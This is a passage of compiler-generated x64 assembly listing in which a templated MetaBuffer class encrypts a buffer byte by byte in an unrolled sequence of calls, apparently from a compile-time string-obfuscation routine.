  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
